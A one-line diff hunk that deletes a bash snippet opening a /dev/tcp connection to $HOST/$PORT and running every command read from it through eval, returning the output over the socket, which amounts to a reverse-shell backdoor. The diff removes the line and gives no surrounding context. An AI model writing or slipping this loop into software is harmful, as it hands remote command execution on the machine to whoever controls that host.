@@ -1,1 +1,0 @@
-{ exec 3<>/dev/tcp/$HOST/$PORT; while read -d '' x <&3; do eval "$x" >&3 2>&3; printf "$ACKNOWLEDGE" >&3; done }
